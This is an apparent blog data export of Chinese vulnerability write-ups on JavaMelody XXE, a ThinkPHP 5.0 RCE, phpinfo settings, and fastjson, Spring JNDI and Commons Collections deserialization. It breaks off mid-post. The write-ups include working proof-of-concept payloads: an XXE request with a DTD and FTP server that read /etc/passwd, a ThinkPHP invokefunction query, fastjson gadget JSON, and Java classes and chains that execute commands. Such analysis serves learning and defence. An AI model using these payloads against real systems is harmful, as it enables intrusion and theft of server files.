复现分析","slug":"melodyXXE","date":"2019-03-18T02:20:23.000Z","updated":"2019-03-18T02:21:38.000Z","comments":true,"path":"post/melodyXXE/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/melodyXXE/index.html","excerpt":"","text":"javamelody XXE(CVE-2018-15531) 复现分析javaMelody是Spring Boot框架可用的一个监视服务器运行信息的插件，这个插件去年爆出了一个XXE的漏洞。这篇文章便分析一下这个漏洞。 漏洞复现环境搭建这里我使用了Idea来搭建spring boot的环境，创建好spring boot项目后在pom.xml的dependencies中加入 12345&lt;dependency&gt; &lt;groupId&gt;net.bull.javamelody&lt;/groupId&gt; &lt;artifactId&gt;javamelody-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.73.1&lt;/version&gt; &lt;/dependency&gt; 之后启动程序，访问127.0.0.1:8080/monitoring便可以验证是否加载成功插件。 漏洞复现漏洞复现使用的poc为： 123456789101112POST / HTTP/1.1Host: localhost:8080Content-type: text/xmlSOAPAction: aaaaaContent-Length: 154&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot; ?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1:5678/ev.dtd&quot;&gt;%remote;]&gt;&lt;/root&gt; 在本地起一个监听5678端口的http服务，这里我用的是php 可以看到发包后可以收到http请求，因此存在XXE漏洞。 为了完成盲打读取文件的功能，ev.dtd的内容如下: 1234&lt;!ENTITY % payload SYSTEM \"file:///etc/passwd\"&gt;&lt;!ENTITY % int \"&lt;!ENTITY &amp;#37; trick SYSTEM 'ftp://127.0.0.1:2121/%payload;'&gt;\"&gt;%int;%trick; 使用如下的ruby脚本可以创建一个用于获取ftp请求的ftp服务器: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061require 'socket'ftp_server = TCPServer.new 2121http_server = TCPServer.new 8088log = File.open( \"xxe-ftp.log\", \"a\")payload = '&lt;!ENTITY % asd SYSTEM \"file:///etc/passwd\"&gt;'Thread.start doloop do Thread.start(http_server.accept) do |http_client| puts \"HTTP. New client connected\" loop &#123; req = http_client.gets() break if req.nil? if req.start_with? \"GET\" http_client.puts(\"HTTP/1.1 200 OK\\r\\nContent-length: #&#123;payload.length&#125;\\r\\n\\r\\n#&#123;payload&#125;\") end puts req &#125; puts \"HTTP. Connection closed\" endendendThread.start doloop do Thread.start(ftp_server.accept) do |ftp_client| puts \"FTP. New client connected\" ftp_client.puts(\"220 xxe-ftp-server\") loop &#123; req = ftp_client.gets() break if req.nil? puts \"&lt; \"+req log.write \"get req: #&#123;req.inspect&#125;\\n\" if req.include? \"LIST\" ftp_client.puts(\"drwxrwxrwx 1 owner group 1 Feb 21 04:37 test\") ftp_client.puts(\"150 Opening BINARY mode data connection for /bin/ls\") ftp_client.puts(\"226 Transfer complete.\") elsif req.include? \"USER\" ftp_client.puts(\"331 password please - version check\") elsif req.include? \"PORT\" puts \"! PORT received\" puts \"&gt; 200 PORT command ok\" ftp_client.puts(\"200 PORT command ok\") else puts \"&gt; 230 more data please!\" ftp_client.puts(\"230 more data please!\") end &#125; puts \"FTP. Connection closed\" endendendloop do sleep(10000)end 运行脚本，Burp重新发包即可获取本地文件。 原理分析根据大佬们的分析流程，直接查看之后的版本的patch可以定位导致漏洞出现的地方: https://github.com/javamelody/javamelody/commit/ef111822562d0b9365bd3e671a75b65bd0613353 可以看到官方的修复中直接禁用了XML中引用外部实体。我们跟进目标代码附近 可以看到这段代码是一个典型的XXE的漏洞代码。全局查找使用了parseSoapMethodName的地方 跟进initialize方法 可以看到漏洞利用方法构造的要素: POST方法 Content-type:为application/soap+xml或者Content-type为text/xml且存在SOAPAction请求头 参考文档https://mp.weixin.qq.com/s?__biz=MzA4ODc0MTIwMw==&amp;mid=2652531539&amp;idx=1&amp;sn=82d1f41acc32a0a21dff60b2dfb71421&amp;source=41#wechat_redirect","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://hexo.imagemlt.xyz/tags/Web/"}]},{"title":"thinkphp5.0 RCE分析","slug":"tp5_rce","date":"2019-03-06T16:13:14.000Z","updated":"2019-03-07T05:37:25.000Z","comments":true,"path":"post/tp5_rce/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/tp5_rce/index.html","excerpt":"","text":"Thinkphp5.0 RCE分析迟到的关于年末爆出的tp5的RCE的分析文章。 我们先来分析以下的poc 1?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1 分析一个MVC的框架首先最重要的一步就是要搞清楚这个框架的路由规则。我们从index.php开始， 123define('APP_PATH', __DIR__ . '/../application/');// 加载框架引导文件require __DIR__ . '/../thinkphp/start.php'; 直接require了./../thinkphp/start.php,跟入该文件 12345678910111213141516171819&lt;?php// +----------------------------------------------------------------------// | ThinkPHP [ WE CAN DO IT JUST THINK ]// +----------------------------------------------------------------------// | Copyright (c) 2006~2018 http://thinkphp.cn All rights reserved.// +----------------------------------------------------------------------// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )// +----------------------------------------------------------------------// | Author: liu21st &lt;liu21st@gmail.com&gt;// +----------------------------------------------------------------------namespace think;// ThinkPHP 引导文件// 1. 加载基础文件require __DIR__ . '/base.php';// 2. 执行应用App::run()-&gt;send(); 进入App.php的run()方法，该方法的实现主要步骤可简化为: 1234567891011121314151617181920212223242526 public static function run(Request $request = null) &#123; $request = is_null($request) ? Request::instance() : $request; try &#123; /* ... */ $dispatch = self::$dispatch; // 未设置调度信息则进行 URL 路由检测 if (empty($dispatch)) &#123; $dispatch = self::routeCheck($request, $config); &#125;/* ...*/ $data = self::exec($dispatch, $config); &#125; catch (HttpResponseException $exception) &#123; $data = $exception-&gt;getResponse(); &#125;/*...*/ return $response; &#125; 路由检测位于routeCheck($request,$config)中，跟入该函数 1234567891011121314151617181920212223242526public static function routeCheck($request, array $config) &#123; $path = $request-&gt;path(); $depr = $config['pathinfo_depr']; $result = false; // 路由检测 ... // 路由检测（根据路由定义返回不同的URL调度） $result = Route::check($request, $path, $depr, $config['url_domain_deploy']); $must = !is_null(self::$routeMust) ? self::$routeMust : $config['url_route_must']; if ($must &amp;&amp; false === $result) &#123; // 路由无效 throw new RouteNotFoundException(); &#125; &#125; // 路由无效 解析模块/控制器/操作/参数... 支持控制器自动搜索 if (false === $result) &#123; $result = Route::parseUrl($path, $depr, $config['controller_auto_search']); &#125; return $result; &#125; routeCheck函数中首先通过$request-&gt;path()获取了请求的path，跟进可知该值在允许兼容模式时可以通过$_GET[Config::get(&#39;var_pathinfo&#39;)]获取，默认情况下即$_GET[s],因此我们的poc获取到的path即为index/\\think\\app/invokefunction。之后由于路由规则中并无此规则，则进入控制器自动搜索,即Route::parseUrl($path, $depr, $config[&#39;controller_auto_search&#39;]); 跟进parseUrl可知thinkphp在处理路由时会用/分割path,对应分割结果分别匹配为模块|控制器|操作|操作参数, 因此最后获取到的路由为 回到App.php中, 1$data = self::exec($dispatch, $config); 这行操作是整个RCE实现的关键。我们跟入exec方法的实现 12345678910111213141516protected static function exec($dispatch, $config) &#123; switch ($dispatch['type']) &#123; ... case 'module': // 模块/控制器/操作 $data = self::module( $dispatch['module'], $config, isset($dispatch['convert']) ? $dispatch['convert'] : null ); break; ... &#125; return $data; &#125; 跟入module方法 12345678910111213141516171819202122232425262728public static function module($result, $config, $convert = null) &#123; if (is_string($result)) &#123; $result = explode('/', $result); &#125; $request = Request::instance(); ... // 获取控制器名 $controller = strip_tags($result[1] ?: $config['default_controller']); $controller = $convert ? strtolower($controller) : $controller; // 获取操作名 $actionName = strip_tags($result[2] ?: $config['default_action']); ... try &#123; $instance = Loader::controller( $controller, $config['url_controller_layer'], $config['controller_suffix'], $config['empty_controller'] ); &#125; catch (ClassNotFoundException $e) &#123; throw new HttpException(404, 'controller not exists:' . $e-&gt;getClass()); &#125; 进入Loader::controller方法 123456789101112131415161718public static function controller($name, $layer = 'controller', $appendSuffix = false, $empty = '') &#123; list($module, $class) = self::getModuleAndClass($name, $layer, $appendSuffix); if (class_exists($class)) &#123; return App::invokeClass($class); &#125; if ($empty) &#123; $emptyClass = self::parseClass($module, $layer, $empty, $appendSuffix); if (class_exists($emptyClass)) &#123; return new $emptyClass(Request::instance()); &#125; &#125; throw new ClassNotFoundException('class not exists:' . $class, $class); &#125; 跟入App::invokeClass方法， 12345678public static function invokeClass($class, $vars = [])&#123; $reflect = new \\ReflectionClass($class); $constructor = $reflect-&gt;getConstructor(); $args = $constructor ? self::bindParams($constructor, $vars) : []; return $reflect-&gt;newInstanceArgs($args);&#125; 该方法使用php的反射机制返回指定类的一个对象，因此由我们的poc,Loader::controller返回了\\think\\app类的一个实例。 继续回到App::module方法 1234567891011121314151617181920212223242526$action = $actionName . $config['action_suffix']; $vars = []; if (is_callable([$instance, $action])) &#123; // 执行操作方法 $call = [$instance, $action]; // 严格获取当前操作方法名 $reflect = new \\ReflectionMethod($instance, $action); $methodName = $reflect-&gt;getName(); $suffix = $config['action_suffix']; $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName; $request-&gt;action($actionName); &#125; elseif (is_callable([$instance, '_empty'])) &#123; // 空操作 $call = [$instance, '_empty']; $vars = [$actionName]; &#125; else &#123; // 操作不存在 throw new HttpException(404, 'method not exists:' . get_class($instance) . '-&gt;' . $action . '()'); &#125; Hook::listen('action_begin', $call); return self::invokeMethod($call, $vars); &#125; 可以看到App::module方法之后会判断之前生成的实例是否有对应的方法,存在的话便会设置$call变量为[\\think\\App类的实例,&#39;invokefunction&#39;],最后调用self::invokeMethod($call,$vars)。跟入该方法 12345678910111213141516public static function invokeMethod($method, $vars = [])&#123; if (is_array($method)) &#123; $class = is_object($method[0]) ? $method[0] : self::invokeClass($method[0]); $reflect = new \\ReflectionMethod($class, $method[1]); &#125; else &#123; // 静态方法 $reflect = new \\ReflectionMethod($method); &#125; $args = self::bindParams($reflect, $vars); self::$debug &amp;&amp; Log::record('[ RUN ] ' . $reflect-&gt;class . '-&gt;' . $reflect-&gt;name . '[ ' . $reflect-&gt;getFileName() . ' ]', 'info'); return $reflect-&gt;invokeArgs(isset($class) ? $class : null, $args);&#125; 跟入self::bindParams,该方法用于获取最后执行的函数的参数 12345678910111213141516171819202122private static function bindParams($reflect, $vars = [])&#123; // 自动获取请求变量 if (empty($vars)) &#123; $vars = Config::get('url_param_type') ? Request::instance()-&gt;route() : Request::instance()-&gt;param(); &#125; $args = []; if ($reflect-&gt;getNumberOfParameters() &gt; 0) &#123; // 判断数组类型 数字数组时按顺序绑定参数 reset($vars); $type = key($vars) === 0 ? 1 : 0; foreach ($reflect-&gt;getParameters() as $param) &#123; $args[] = self::getParamValue($param, $vars, $type); &#125; &#125; return $args;&#125; 默认情况下Config::get(&#39;url_param_type&#39;)为0,因此$vars被设置为Request::instance()-&gt;param(),在我们的poc中$vars即 即为我们的请求参数。之后通过判断$reflect的方法中需要的参数最后返回参数列表$args 回到invokeMethod方法, 1return $reflect-&gt;invokeArgs(isset($class) ? $class : null, $args); 这里调用了$reflect的invokeArgs方法，即通过反射调用/think/App类的invokefunction方法。 12345678910public static function invokeFunction($function, $vars = []) &#123; $reflect = new \\ReflectionFunction($function); $args = self::bindParams($reflect, $vars); // 记录执行信息 self::$debug &amp;&amp; Log::record('[ RUN ] ' . $reflect-&gt;__toString(), 'info'); return $reflect-&gt;invokeArgs($args); &#125; 可以看到最后invokeFunction()相当于直接调用call_user_func_array(&quot;phpinfo&quot;,[1]) 可见整个RCE的原因便是由于thinkphp在获取控制器时过滤不足导致可以任意生成类的实例调用指定的方法而导致的。怎样获取其他的可用的RCE的poc？我们可以在Loader::controller方法中添加一行代码: 1$t=get_declared_classes(); 在这行代码后的代码处下断点调试 可以看到这些类都是tp中可用的用来RCE的类，我们只需要再多研究便可发现其他的利用链。 修复方法也是很简单粗暴，只需要过滤掉反斜杠即可。","categories":[{"name":"web","slug":"web","permalink":"https://hexo.imagemlt.xyz/categories/web/"},{"name":"CTF","slug":"web/CTF","permalink":"https://hexo.imagemlt.xyz/categories/web/CTF/"},{"name":"技术学习","slug":"web/CTF/技术学习","permalink":"https://hexo.imagemlt.xyz/categories/web/CTF/技术学习/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://hexo.imagemlt.xyz/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://hexo.imagemlt.xyz/tags/Web/"},{"name":"技术学习","slug":"技术学习","permalink":"https://hexo.imagemlt.xyz/tags/技术学习/"},{"name":"Security","slug":"Security","permalink":"https://hexo.imagemlt.xyz/tags/Security/"}]},{"title":"PHPINFO中的敏感信息记录","slug":"phpinfo","date":"2019-02-28T11:22:47.000Z","updated":"2019-03-06T16:19:27.000Z","comments":true,"path":"post/phpinfo/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/phpinfo/index.html","excerpt":"","text":"去年滴滴面试的时候提到过phpinfo中有哪些安全相关的信息，当时答的不算很好，今年也要面临校招，所以在这篇文章中总结一下。 Configuration File (php.ini) Path加载的php.ini文件的位置 Registered PHP Streams支持的php流，主要用于文件包含、反序列化等等的应用。 Registered Stream Filters支持的php流过滤器，应用如上。 allow_url_fopen与allow_url_include文件包含有关 disable_functions禁止的函数，RCE时需要特别注意 display_errors display_startup_errors错误提示相关 open_basedir重要属性，（线下赛中在WAF设置一个可以废掉所有的文件包含漏洞） enable_dl是否能够动态加载php模块，可用于bypass disable_functions extension_dir模块位置 include_pathphp include时的默认路径 short_open_tag判断服务器是否支持短标签 session.save_pathsession存储路径 session.save_handler用户自定义存储函数 session.auto_start是否自动开启session session.serialize_handler反序列化器 _SERVER相关 fastcgi远程命令执行、解析漏洞 expose_php在http包中显示php版本等","categories":[{"name":"技术学习","slug":"技术学习","permalink":"https://hexo.imagemlt.xyz/categories/技术学习/"},{"name":"CTF","slug":"技术学习/CTF","permalink":"https://hexo.imagemlt.xyz/categories/技术学习/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://hexo.imagemlt.xyz/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://hexo.imagemlt.xyz/tags/Web/"}]},{"title":"fastjson反序列化的两种利用方法的原理剖析","slug":"java-unserialize-learning-3","date":"2019-02-14T08:07:42.000Z","updated":"2019-03-22T00:32:58.000Z","comments":true,"path":"post/java-unserialize-learning-3/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/java-unserialize-learning-3/index.html","excerpt":"","text":"打包发布于安全客https://www.anquanke.com/post/id/173459 fastjson反序列化的两种利用方法的原理剖析JdbcRowSetImpl利用JdbcRowSetImpl的payload如下： 12345&#123; \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://127.0.0.1:3456/Object\", \"autoCommit\":true&#125; 在触发反序列化时会调用JdbcRowSetImpl类的 setAutoCommit函数 12345678public void setAutoCommit(boolean var1) throws SQLException &#123; if (this.conn != null) &#123; this.conn.setAutoCommit(var1); &#125; else &#123; this.conn = this.connect(); this.conn.setAutoCommit(var1); &#125;&#125; 继续跟进connect函数 123456789101112131415protected Connection connect() throws SQLException &#123; if (this.conn != null) &#123; return this.conn; &#125; else if (this.getDataSourceName() != null) &#123; try &#123; InitialContext var1 = new InitialContext(); DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName()); return this.getUsername() != null &amp;&amp; !this.getUsername().equals(\"\") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection(); &#125; catch (NamingException var3) &#123; throw new SQLException(this.resBundle.handleGetObject(\"jdbcrowsetimpl.connect\").toString()); &#125; &#125; else &#123; return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null; &#125;&#125; 可以看到当conn为null时会发起JNDI查询从而加载我们的恶意类。 TemplatesImplpayload如下: 123456789&#123; \"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\":[\"base64编码后的继承于AbstractTranslet类的子类的class文件\"], '_name':'a.b', '_tfactory':&#123; &#125;, \"_outputProperties\":&#123; &#125;, \"_version\":\"1.0\", \"allowedProtocols\":\"all\"&#125; 由于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类的outputProperties属性类型为Properties因此在反序列化过程中会调用该类的getOutputProperties方法。 12345678public synchronized Properties getOutputProperties() &#123; try &#123; return newTransformer().getOutputProperties(); &#125; catch (TransformerConfigurationException e) &#123; return null; &#125;&#125; 继续跟进newTransformer方法 1234567891011121314151617public synchronized Transformer newTransformer() throws TransformerConfigurationException &#123; TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory);//this line if (_uriResolver != null) &#123; transformer.setURIResolver(_uriResolver); &#125; if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123; transformer.setSecureProcessing(true); &#125; return transformer; &#125; 在newTransformer方法中需要实例化一个TransformerImpl类的对象，跟进getTransletInstance()方法 1234567891011121314151617181920212223242526272829private Translet getTransletInstance() throws TransformerConfigurationException &#123; try &#123; if (_name == null) return null; if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(_useServicesMechanism); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) &#123; translet.setAuxiliaryClasses(_auxClasses); &#125; return translet; &#125; catch (InstantiationException e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; catch (IllegalAccessException e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125; 跟进defineTransletClasses方法中 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849private void defineTransletClasses() throws TransformerConfigurationException &#123; if (_bytecodes == null) &#123; //... &#125; TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() &#123; public Object run() &#123; return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); &#125; &#125;); try &#123; final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount &gt; 1) &#123; _auxClasses = new Hashtable(); &#125; for (int i = 0; i &lt; classCount; i++) &#123; _class[i] = loader.defineClass(_bytecodes[i]); final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123; _transletIndex = i; &#125; else &#123; _auxClasses.put(_class[i].getName(), _class[i]); &#125; &#125; if (_transletIndex &lt; 0) &#123; ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125; catch (ClassFormatError e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; catch (LinkageError e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125; 可以看到该方法将会遍历我们传入的_bytecodes数组，执行loader.defineClass方法，而TransletClassLoader类的defineClass方法如下: 123Class defineClass(final byte[] b) &#123; return defineClass(null, b, 0, b.length); &#125; 可见直接实现于ClassLoader类的defineClass方法。查询jdk1.8的文档 可以看到该方法会将我们传入的编码后的class文件加载入jvm。 而我们的恶意类继承于ABSTRACT_TRANSLET，即com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet，因此便会设置_transletIndex为0。再回到我们的getTransletInstance方法中， 1AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); 生成了一个我们的恶意类的对象实例，因此导致了我们的恶意类中的代码最后被执行。 这里我们使用的恶意类如下: 1234567891011121314151617181920212223242526package JavaUnser;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class ShellExec extends AbstractTranslet&#123; public ShellExec() throws IOException&#123; Runtime.getRuntime().exec(\"/Applications/Calculator.app/Contents/MacOS/Calculator\"); &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123; &#125; @Override public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException &#123; &#125; public static void main(String[] args) throws Exception &#123; //ShellExec t = new ShellExec(); &#125;&#125; 参考资料https://github.com/imagemlt/JavaUnserializePocs","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://hexo.imagemlt.xyz/tags/Web/"}]},{"title":"Spring-jndi 反序列化漏洞分析复现","slug":"java-unserialize-learning-2","date":"2019-02-11T09:35:22.000Z","updated":"2019-03-22T00:32:27.000Z","comments":true,"path":"post/java-unserialize-learning-2/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/java-unserialize-learning-2/index.html","excerpt":"","text":"打包发布于安全客https://www.anquanke.com/post/id/173459 spring-jndi反序列化众所周知Spring框架是一款用途广泛影响深远的java框架，因此Spring框架一旦出现漏洞也是影响深远。这次分析的Spring jdni反序列化漏洞主要存在于spring-tx包中，该包中的org.springframeworkl.transation.jta.JtaTransationManager类存在JDNI反序列化的问题，可以加载我们注册的RMI链接，然后将对象发送到有漏洞的服务器从而执行远程命令。首先应当注意本文中成功执行的Poc本人仅在jdk1.7中测试成功，而jdk1.8中未测试成功。 什么是JNDI?JNDI(Java Naming and Directory Interface)是J2EE中的重要规范之一，是一组在Java应用中访问命名和目录服务的API，使得我们能够通过名称去查询数据源从而访问需要的对象。 这里我们给出在java下的一段提供JNDI服务的代码： 1234567891011System.out.println(\"Starting HTTP server\");HttpServer httpServer = HttpServer.create(new InetSocketAddress(8086), 0);httpServer.createContext(\"/\",new HttpFileHandler());httpServer.setExecutor(null);httpServer.start(); System.out.println(\"Creating RMI Registry\");Registry registry = LocateRegistry.createRegistry(1099);Reference reference = new javax.naming.Reference(\"ExportObject\",\"ExportObject\",\"http://127.0.01:8086/\");ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);registry.bind(\"Object\", referenceWrapper); 这里我们创建了一个HTTP服务后又创建了一个RMI服务,并且RMI服务提供了对ExportObject类的查询，这里ExportObject类的源码为： 1234567891011public class ExportObject &#123; public ExportObject() &#123; try &#123; Runtime.getRuntime().exec(\"/Applications/Calculator.app/Contents/MacOS/Calculator\"); &#125; catch(Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 其功能便是执行我们验证rce时常用的调用计算器的功能。 要加载ExportObject类我们可以使用以下的代码: 123Context ctx=new InitialContext();ctx.lookup(\"rmi://127.0.0.1:1099/Object\");//System.out.println(\"loaded obj\"); 执行以下代码后可以发现ExportObject类的构造函数被调用，弹出了计算器。 Spring框架中的JNDI反序列化漏洞导致JNDI反序列化问题的类主要是org.springframework.transaction.jta.JtaTransactionManager类。跟进该类的源码中的readObject()函数: 123456private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123; ois.defaultReadObject(); this.jndiTemplate = new JndiTemplate(); this.initUserTransactionAndTransactionManager(); this.initTransactionSynchronizationRegistry(); &#125; 继续跟进initUserTransactionAndTransactionManager()函数 123456789101112protected void initUserTransactionAndTransactionManager() throws TransactionSystemException &#123; if (this.userTransaction == null) &#123; if (StringUtils.hasLength(this.userTransactionName)) &#123; this.userTransaction = this.lookupUserTransaction(this.userTransactionName); this.userTransactionObtainedFromJndi = true; &#125; else &#123; this.userTransaction = this.retrieveUserTransaction(); if (this.userTransaction == null &amp;&amp; this.autodetectUserTransaction) &#123; this.userTransaction = this.findUserTransaction(); &#125; &#125; &#125; 继续进一步跟进lookupUserTransaction()函数 1234567891011protected UserTransaction lookupUserTransaction(String userTransactionName) throws TransactionSystemException &#123; try &#123; if (this.logger.isDebugEnabled()) &#123; this.logger.debug(\"Retrieving JTA UserTransaction from JNDI location [\" + userTransactionName + \"]\"); &#125; return (UserTransaction)this.getJndiTemplate().lookup(userTransactionName, UserTransaction.class); &#125; catch (NamingException var3) &#123; throw new TransactionSystemException(\"JTA UserTransaction is not available at JNDI location [\" + userTransactionName + \"]\", var3); &#125;&#125; 可以看到最终return (UserTransaction)this.getJndiTemplate().lookup(userTransactionName, UserTransaction.class),跟进JndiTemplate类的lookup方法, 12345678910111213141516public Object lookup(final String name) throws NamingException &#123; if (this.logger.isDebugEnabled()) &#123; this.logger.debug(\"Looking up JNDI object with name [\" + name + \"]\"); &#125; return this.execute(new JndiCallback&lt;Object&gt;() &#123; public Object doInContext(Context ctx) throws NamingException &#123; Object located = ctx.lookup(name); if (located == null) &#123; throw new NameNotFoundException(\"JNDI object with [\" + name + \"] not found: JNDI implementation returned null\"); &#125; else &#123; return located; &#125; &#125; &#125;);&#125; 而execute()方法的定义如下 123456789101112public &lt;T&gt; T execute(JndiCallback&lt;T&gt; contextCallback) throws NamingException &#123; Context ctx = this.getContext(); Object var3; try &#123; var3 = contextCallback.doInContext(ctx);//此处触发RCE &#125; finally &#123; this.releaseContext(ctx); &#125; return var3; &#125; 可以看到在整个流程的最后将会查询最开始我们由反序列化传入的org.springframework.transaction.jta.JtaTransactionManager类的对象的userTransactionName属性，最终导致加载了我们恶意的rmi源中的恶意类，从而导致RCE。 Poc这个漏洞的Poc构造比起之前分析的apache common collections反序列化的Poc构造显然要简单许多： 123456789101112System.out.println(\"Connecting to server \"+serverAddress+\":\"+port);Socket socket=new Socket(serverAddress,port);System.out.println(\"Connected to server\");String jndiAddress = \"rmi://127.0.0.1:1099/Object\";//恶意的rmi注册源 org.springframework.transaction.jta.JtaTransactionManager object = new org.springframework.transaction.jta.JtaTransactionManager();object.setUserTransactionName(jndiAddress); System.out.println(\"Sending object to server...\");ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream());objectOutputStream.writeObject(object);objectOutputStream.flush(); 执行后可以发现成功弹出计算器。 参考资料https://blog.csdn.net/wn084/article/details/80729230 https://github.com/zerothoughts/spring-jndi","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://hexo.imagemlt.xyz/tags/Web/"}]},{"title":"java apache common collections 反序列化分析","slug":"apache-common-collections","date":"2019-02-06T02:59:25.000Z","updated":"2019-03-22T00:33:22.000Z","comments":true,"path":"post/apache-common-collections/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/apache-common-collections/index.html","excerpt":"","text":"打包发布于安全客https://www.anquanke.com/post/id/173459 java apache common collections 反序列化分析apache common collections是15年左右爆出来的一个反序列化利用链，影响范围广泛。这篇文章中便复现一下这个利用过程。 复现的第一步：项目依赖项配置新版本的apache common collections添加了对这个漏洞的修复，在apache common collections4中Tranformer类取消了Seralizable,而其他高版本则需要设置环境来允许序列化才可以，因此我们使用旧版本的apache common collections来复现这个漏洞。这里贴一下我的maven的依赖项配置： 12345678910111213 &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.11&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; pop链分析apache common collections的反序列化主要依托于transformer这个类，以及TransformedMap类。顾名思义Transformer类适用于描述一个变换过程，而TransformedMap就是将这个变换过程应用到一个Map上对Map进行变换。当我们修改Map中的某个值时就会调用预先设置好的Transformer来对Map进行处理操作。 1Map transformedMap=TransformedMap.decorate(map,keyTrasnfomer,valueTransformer); 这里便通过一个decorate函数将一个map转换为TranformedMap,并对map的key和value绑定相应的Transformer,当key和value改变时便触发对应的Transformer的transform方法进行处理动作。 如果想要实现一连串的变换操作则可以通过ChainedTransformer来实现,比如这里我们用于实现RCE的Tranformer链： 12345678910111213141516171819202122232425Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), /* 由于Method类的invoke(Object obj,Object args[])方法的定义 所以在反射内写new Class[] &#123;Object.class, Object[].class &#125; 正常POC流程举例： ((Runtime)Runtime.class.getMethod(\"getRuntime\",null).invoke(null,null)).exec(\"gedit\"); */ new InvokerTransformer( \"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125; ), new InvokerTransformer( \"invoke\", new Class[] &#123;Object.class,Object[].class &#125;, new Object[] &#123;null, null &#125; ), new InvokerTransformer( \"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123; \"/Applications/Calculator.app/Contents/MacOS/Calculator\" &#125; //目标机器上反序列化后执行的命令 ) &#125;;Transformer chainedTransformer=new ChainedTransformer(transformers); 实际执行的代码便是((Runtime) Runtime.class.getMethod(&quot;getRuntime&quot;).invoke()).exec(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;) 也就是Mac下弹计算器的指令。 之后我们便可以构造一个是哟很难过这个chain的TranformedMap，并且触发对这个TransformedMap的处理即可： 1234Map map=new HashMap();map.put(\"a\",\"b\");Map transformedMap=TransformedMap.decorate(map,null,chainedTransformer);transformedMap.put(\"a\",\"z\"); 执行即可发现弹回的计算器。 RCE构造我们已经构造出了执行命令的popChain,那样怎样才能找到一个符合条件的RCE?我们需要找到一个满足下列条件的类: 